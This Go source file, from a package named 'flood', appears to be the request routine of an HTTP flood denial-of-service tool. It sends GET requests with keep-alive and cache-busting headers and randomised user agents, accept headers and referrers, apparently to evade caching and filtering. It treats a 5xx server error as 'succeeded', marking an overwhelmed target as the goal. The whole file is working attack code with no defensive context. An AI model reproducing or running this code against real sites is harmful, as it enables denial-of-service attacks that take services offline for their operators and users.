package flood

import (
	"context"
	"errors"
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"strings"
)

func (t *Target) performHttp(ctx context.Context, addr string) error {
	method := "GET"
	request, err := http.NewRequestWithContext(ctx, method, addr, nil)
	if err != nil {
		return err
	}
	request.Host = t.host
	request.Header.Set("Host", t.host)
	request.Header.Set("Connection", "Keep-Alive")
	request.Header.Set("User-Agent", userAgent())
	request.Header.Set("Pragma", "no-cache")
	request.Header.Set("Cache-Control", "no-transform,no-store")
	request.Header.Set("Keep-Alive", "timeout=1000")
	request.Header.Set("Accept-Encoding", "gzip,deflate")
	additionalHeaders(request)

	accept := acceptall[rand.Intn(len(acceptall))]
	for _, l := range strings.Split(accept, "\r\n") {
		if l == "" {
			continue
		}
		h := strings.Split(l, ": ")
		request.Header.Add(h[0], h[1])
	}
	request.Header.Set("Referrer", referers[rand.Intn(len(referers))])

	body, err := t.httpClient.Do(request)
	if err == nil && body != nil {
		_, err = io.Copy(ioutil.Discard, body.Body)
		body.Body.Close()
		ec := body.StatusCode / 100
		if ec > 4 {
			return errors.New("succeeded")
		}
	}
	return err
}
